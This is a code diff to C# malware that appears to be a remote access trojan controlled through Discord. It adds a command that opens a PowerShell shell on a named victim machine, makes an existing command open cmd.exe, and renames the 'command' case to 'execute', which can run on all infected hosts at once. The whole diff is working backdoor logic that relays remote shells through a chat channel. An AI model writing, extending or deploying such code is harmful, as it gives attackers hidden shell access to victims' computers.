@@ -272,10 +272,18 @@ namespace payload
                         if (args[0] != Environment.MachineName) break;
                         Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
                         shells.Add(s);
-                        s.Start();
+                        s.Start("cmd.exe");
                         break;
                     }
-                case "command":
+                case "powershell":
+                    {
+                        if (args[0] != Environment.MachineName) break;
+                        Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
+                        shells.Add(s);
+                        s.Start("powershell.exe");
+                        break;
+                    }
+                case "execute":
                     {
                         if (args[0] != Environment.MachineName && args[0].ToLower() != "all") break;
                         args.RemoveAt(0);
